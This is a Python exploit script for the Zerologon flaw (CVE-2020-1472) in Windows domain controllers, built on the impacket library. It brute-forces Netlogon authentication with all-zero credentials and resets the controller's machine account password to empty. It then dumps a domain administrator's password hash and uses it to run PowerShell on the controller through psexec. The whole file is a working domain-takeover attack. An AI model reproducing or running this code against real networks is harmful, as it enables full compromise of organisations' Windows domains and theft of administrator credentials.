#!/usr/bin/env python3
from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT, NDRENUM, NDRUNION, NDRPOINTER, NDRUniConformantArray
from impacket.dcerpc.v5 import nrpc, epm
from impacket.dcerpc.v5.dtypes import NULL, WSTR, LPWSTR, DWORD, ULONG, USHORT, PGUID, NTSTATUS, LONG, UCHAR, PRPC_SID, \
    GUID, RPC_UNICODE_STRING, SECURITY_INFORMATION, LPULONG
from impacket.dcerpc.v5 import transport
from impacket import crypto
from struct import pack, unpack
import hmac, hashlib, struct, sys, socket, time
from binascii import hexlify, unhexlify
from subprocess import check_call
MAX_ATTEMPTS = 2000 # False negative chance: 0.04%
def update_authenticator(cSC, sK, timestamp):
    authenticator = nrpc.NETLOGON_AUTHENTICATOR()
    authenticator['Credential'] = b'\x00' * 8
    authenticator['Timestamp'] = timestamp
    return authenticator

def fail(msg):
  print(msg, file=sys.stderr)
  print('This might have been caused by invalid arguments or network issues.', file=sys.stderr)
  sys.exit(2)

def try_zero_authenticate(dc_handle, dc_ip, target_computer):
  # Connect to the DC's Netlogon service.
  binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
  rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
  rpc_con.connect()
  rpc_con.bind(nrpc.MSRPC_UUID_NRPC)

  # Use an all-zero challenge and credential.
  plaintext = b'\x00' * 8
  ciphertext = b'\x00' * 8

  # Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled.
  flags = 0x212fffff

  # Send challenge and authentication request.
  resp = nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + '\x00', target_computer + '\x00', plaintext)
  serverChallenge = resp['ServerChallenge']

  try:
    server_auth = nrpc.hNetrServerAuthenticate3(
      rpc_con, dc_handle + '\x00', target_computer + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
      target_computer + '\x00', ciphertext, flags
    )
    # It worked!
    assert server_auth['ErrorCode'] == 0
    return rpc_con, serverChallenge

  except nrpc.DCERPCSessionError as ex:
    # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
    if ex.get_error_code() == 0xc0000022:
      return None, None
    else:
      fail(f'Unexpected error code from DC: {ex.get_error_code()}.')
  except BaseException as ex:
    raise ex
    fail(f'Unexpected error: {ex}.')


def perform_attack(dc_handle, dc_ip, target_computer, target_da="Administrator"):
  # Keep authenticating until succesfull. Expected average number of attempts needed: 256.
  print('Performing authentication attempts...')
  rpc_con = None
  for attempt in range(0, MAX_ATTEMPTS):
    rpc_con, serverChallenge = try_zero_authenticate(dc_handle, dc_ip, target_computer)


    if rpc_con == None:
        print('=', end='', flush=True)
    else:
        break
  if rpc_con:
    print('\nSuccess! DC can be fully compromised by a Zerologon attack.')
    plaintext = b'\x00' * 8
    sessionKey = nrpc.ComputeSessionKeyStrongKey('', plaintext, serverChallenge, None)
    ppp = nrpc.ComputeNetlogonCredential(plaintext, sessionKey)
    clientStoredCredential = pack('<Q', unpack('<Q', ppp)[0] + 10)
    CLP = nrpc.NL_TRUST_PASSWORD()
    CLP['Buffer'] = b'\x00' * 512
    CLP['Length'] = '\x00\x00\x00\x00'
    blah = nrpc.hNetrServerPasswordSet2(
        rpc_con, dc_handle + '\x00',
        target_computer + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
        target_computer + '\x00',
        update_authenticator(clientStoredCredential, sessionKey, 0), b'\x00' * 516
    )
    blah.dump()
    import secretsdump, psexec
    class SDOptions:
        def __init__(self):
            self.use_vss = False
            self.target_ip = dc_ip
            self.outputfile = './dumped.tmp'
            self.hashes = "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"
            self.exec_method = "smbexec"
            self.just_dc = True
            self.just_dc_ntlm = True
            self.just_dc_user = target_da
            self.pwd_last_set = self.user_status = self.resumefile = \
            self.k = self.history = self.ntds = self.sam = self.security = \
            self.system = self.aesKey = self.bootkey = None
            self.dc_ip = dc_ip
    class PSOptions:
        def __init__(self):
            self.help = False
    dump = secretsdump.DumpSecrets(dc_ip, target_computer+'$', '', '', SDOptions()).dump()
    f= open("dumped.tmp.ntds").read()
#    print(f)
    hashes = ':'.join(f.split(':')[2:-3])
    print(hashes)
    psexec = psexec.PSEXEC('powershell.exe -c Reset-ComputerMachinePassword', None, None, None, hashes=hashes, username=target_da, serviceName='fucked')
    psexec.run(dc_name, dc_ip)
  else:
    print('\nAttack failed. Target is probably patched.')
    sys.exit(1)


if __name__ == '__main__':
  if not (3 <= len(sys.argv) <= 4):
    print('Usage: %s dc_name dc_ip [target_domain_admin_username]\n' % sys.argv[0])
    print('Exploits a domain controller that is vulnerable to the Zerologon attack (CVE-2020-1472).')
    print('Note: dc-name should be the (NetBIOS) computer name of the domain controller.')
    print("Addtl. Note: target_domain_admin_username should be a username associated with a known domain administrator of the same domain as the target DC.")
    sys.exit(1)
  else:

    if len(sys.argv) == 4:
        [_, dc_name, dc_ip, target_da] = sys.argv
        dc_name = dc_name.rstrip('$') 
        perform_attack('\\\\' + dc_name, dc_ip, dc_name, target_da)
    else:
        [_, dc_name, dc_ip] = sys.argv
        dc_name = dc_name.rstrip('$') 
        perform_attack('\\\\' + dc_name, dc_ip, dc_name)

